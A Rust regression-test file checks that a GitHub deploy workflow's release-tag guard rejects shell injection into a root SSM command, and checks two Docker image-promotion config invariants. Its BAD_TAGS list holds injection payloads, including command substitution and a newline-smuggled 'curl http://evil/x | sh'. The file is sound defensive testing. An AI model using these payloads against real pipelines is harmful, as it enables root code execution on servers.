//! Regression tests for `.github/workflows/deploy.yml`: the release-tag guard
//! and the image build-and-promote config invariants.

use std::path::Path;
use std::process::Command;

/// Integration tests run with the CWD set to the package root (`xtask/`), so
/// every repo path is built from the manifest dir's parent, never from `"../"`.
fn workflow() -> String {
    let path = Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .expect("xtask/ always has a workspace-root parent")
        .join(".github/workflows/deploy.yml");
    std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("cannot read {}: {e}", path.display()))
}

// ---------------------------------------------------------------------------
// Release-tag guard
//
// `github.event.release.tag_name` is externally influenced (any repo-write
// actor can publish a release) and is embedded in the SSM AWS-RunShellScript
// `commands` string, which the relay instance re-parses as a shell script AS
// ROOT. Step-level `env:` protects only the runner's bash, not that hop, and
// prod carries no required reviewer — so the guard in deploy.yml's `meta` job
// is the only thing between a crafted tag and root RCE on prod.
//
// The guard CONDITION is lifted out of deploy.yml and EVALUATED the way the
// workflow evaluates it — never grepped for its regex text. That distinction is
// load-bearing: a line-oriented `grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+$'` carries
// the correct-looking regex yet anchors to a LINE, so `"v1.0.0\n<anything>"`
// passes it. Text-matching the regex called that guard healthy; evaluating it
// does not. `harness_detects_line_anchored_grep_as_broken` below pins that.
// ---------------------------------------------------------------------------

/// The whole `if ! <condition>; then` test, operator and all, so a change of
/// matching technique (grep pipeline vs. bash `[[ =~ ]]`) is exercised, not
/// just a change of pattern.
fn guard_condition(workflow: &str) -> String {
    workflow
        .lines()
        .filter_map(|l| l.trim_start().strip_prefix("if ! ")?.strip_suffix("; then"))
        .find(|cond| cond.contains("RELEASE_TAG"))
        .expect("no release-tag guard condition found in .github/workflows/deploy.yml")
        .to_string()
}

/// Evaluates the workflow's own condition with `RELEASE_TAG` bound to `tag`.
/// True (exit 0) means the guard would let the tag through to `deploy_tag=`.
///
/// The payload is passed as an ARGV element and read back via `$1`; splicing it
/// into the script text would re-introduce the very injection under test.
fn guard_accepts(cond: &str, tag: &str) -> bool {
    Command::new("bash")
        .arg("-c")
        .arg(format!("RELEASE_TAG=\"$1\"; {cond}"))
        .arg("_")
        .arg(tag)
        .status()
        .expect("bash is required to evaluate the guard condition")
        .success()
}

/// Every one of these must be REFUSED. The multi-line cases are the regression:
/// `grep -q` exits 0 on the FIRST matching line, so a valid vX.Y.Z first line
/// smuggles the rest of the value into `deploy_tag=` — and because
/// `$GITHUB_OUTPUT` is line-oriented, the LAST `deploy_tag=` line wins, leaving
/// pure shell metacharacters bound for AWS-RunShellScript as root.
const BAD_TAGS: [&str; 7] = [
    "v1.0.0$(id)",
    "v1.0.0`id`",
    "v1.0.0;id",
    "v1.0.0\ndeploy_tag=; curl http://evil/x | sh",
    "v1.0.0\nfoo",
    "\nv1.0.0",
    "v1.0.0\r",
];

#[test]
fn release_tag_guard_rejects_injection_payloads() {
    let cond = guard_condition(&workflow());
    let accepted: Vec<String> = BAD_TAGS
        .iter()
        .filter(|tag| guard_accepts(&cond, tag))
        .map(|tag| format!("guard ACCEPTS injection tag: {tag:?}"))
        .collect();
    assert!(
        accepted.is_empty(),
        "condition {cond:?} lets shell metacharacters through to a root SSM command:\n{}",
        accepted.join("\n")
    );
}

#[test]
#[should_panic(expected = "no release-tag guard condition found")]
fn missing_guard_condition_is_a_failure_not_a_silent_pass() {
    // Losing the guard must read as this test failing, never as every payload
    // sailing through an empty condition that bash evals as success.
    guard_condition("jobs:\n  meta:\n    run: echo no guard here\n");
}

#[test]
fn release_tag_guard_accepts_a_legitimate_release_tag() {
    let cond = guard_condition(&workflow());
    assert!(
        guard_accepts(&cond, "v0.1.1"),
        "condition {cond:?} REJECTS v0.1.1 — a real release-please `simple`-strategy tag must still deploy"
    );
}

#[test]
fn harness_detects_line_anchored_grep_as_broken() {
    // Self-check: the two tests above are only worth their runtime because they
    // EVALUATE the condition. Fed the historical broken guard — whose regex
    // text is indistinguishable from the correct one — this harness must still
    // see the multi-line payloads ride through.
    let broken = r#"printf '%s\n' "$RELEASE_TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+$'"#;
    let smuggled: Vec<&&str> =
        ["v1.0.0\nfoo", "\nv1.0.0"].iter().filter(|tag| guard_accepts(broken, tag)).collect();
    assert_eq!(
        smuggled.len(),
        2,
        "a line-anchored grep condition must read as ACCEPTING {smuggled:?} — \
         if it does not, this harness has lost its teeth and would call the broken guard healthy"
    );
}

// ---------------------------------------------------------------------------
// Image build-and-promote config invariants
//
// Class of defect these catch: a workflow step whose ACTION DEFAULTS silently
// invalidate a later step's assumption. It has bitten M3 twice.
//
//   1. `docker/setup-buildx-action` defaults to `driver: docker-container` AND
//      `use: true`, so it makes a container-driver builder CURRENT. `docker
//      build` is an alias for `docker buildx build`, so the build then runs on
//      that driver; with no `--load` the image never lands in the local image
//      store, buildx STILL EXITS 0 (it only warns), and the following `docker
//      push` fails with "An image does not exist locally with the tag". The job
//      is currently written with no setup-buildx step at all — buildx is
//      preinstalled on the runner and `imagetools create` is a pure registry
//      operation needing no builder — so this check is conditional: if the step
//      is ever reintroduced it must pin `use: false` or `driver: docker`.
//
//   2. `docker buildx imagetools create` defaults to `--prefer-index=true`,
//      which wraps a single-source image in a NEW image index, so the promoted
//      v-tag would land on a DIFFERENT digest than the sha- tag it promotes and
//      break byte-identity between what staging validated and what prod runs
//      (D6, SC3). The retag must stay a carbon copy: `--prefer-index=false`.
// ---------------------------------------------------------------------------

/// Comment lines are stripped first: deploy.yml's prose explaining why the
/// setup-buildx step is absent, and why the retag needs `--prefer-index=false`,
/// must not read as the steps themselves being present.
fn workflow_code(workflow: &str) -> Vec<&str> {
    workflow.lines().filter(|l| !l.trim_start().starts_with('#')).collect()
}

#[test]
fn setup_buildx_action_if_present_is_not_made_the_current_builder() {
    let workflow = workflow();
    let code = workflow_code(&workflow);
    let uses_buildx = code.iter().any(|l| {
        l.trim_start()
            .trim_start_matches("- ")
            .trim_start()
            .strip_prefix("uses:")
            .is_some_and(|rest| rest.trim_start().starts_with("docker/setup-buildx-action"))
    });
    if !uses_buildx {
        return; // buildx is preinstalled; imagetools needs no builder.
    }
    let pinned = code.iter().map(|l| l.trim()).any(|l| {
        l.strip_prefix("use:").map(str::trim) == Some("false")
            || l.strip_prefix("driver:").map(str::trim) == Some("docker")
    });
    assert!(
        pinned,
        "deploy.yml uses docker/setup-buildx-action without 'use: false' or 'driver: docker'. \
         Its defaults make a docker-container builder current, so 'docker build' produces no \
         local image and the following 'docker push' fails."
    );
}

#[test]
fn every_imagetools_retag_prefers_the_source_manifest() {
    let workflow = workflow();
    let retags: Vec<&str> =
        workflow_code(&workflow).into_iter().filter(|l| l.contains("imagetools create")).collect();
    assert!(
        !retags.is_empty(),
        "no 'imagetools create' retag found in deploy.yml — promotion must be a retag, never a rebuild"
    );
    let unpinned: Vec<String> = retags
        .iter()
        .filter(|l| !l.contains("--prefer-index=false"))
        .map(|l| format!("imagetools create without --prefer-index=false:{l}"))
        .collect();
    assert!(
        unpinned.is_empty(),
        "the default (true) rewraps the image in a new index, changing the digest and breaking \
         byte-identity between the sha- tag staging validated and the v-tag prod runs:\n{}",
        unpinned.join("\n")
    );
}
